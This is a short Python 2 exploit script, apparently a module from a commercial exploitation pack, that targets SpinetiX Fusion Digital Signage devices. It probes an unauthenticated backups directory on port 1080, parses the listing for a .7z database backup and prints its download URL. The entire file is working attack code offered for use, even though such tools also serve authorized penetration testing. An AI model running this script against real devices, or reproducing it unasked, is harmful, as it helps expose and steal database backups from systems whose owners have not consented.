#! /usr/bin/env python2
 
#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2020
#

###
# STD modules
###
import os, sys, re
import requests

_name_   = 'd2sec_spinetix_1'
_vendor_ = 'spinetix'
_model_  = ['Fusion Digital Signage']
_vuln_   = 'Database Backup Disclosure Vulnerability'
_cve_    = ''
_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5593.php'
_port_   = 1080

def pwnrouter(host,port=_port_):
  try:
    url = 'http://%s:%d/content/files/backups/' % (host,port)        
    response = requests.get(url)    
  except Exception, e:
    print '[-] error : %s' % e
    return
  if response is None:
    print '[+] %s not vulnerable' % host
  if '.7z</a>' in response.text:    
    m = re.search('>([^<]+\.7z)</a>', response.text)
    if m is None:
        print '[+] %s not vulnerable' % host
        return           
    print '[+] %s vulnerable' % host
    print '[+] database backup can be downloaded here: %s%s\n' % (url, m.group(1))     
  else:            
    print '[+] %s not vulnerable' % host
    

if __name__ == "__main__":
  pwnrouter(sys.argv[1], int(sys.argv[2]))
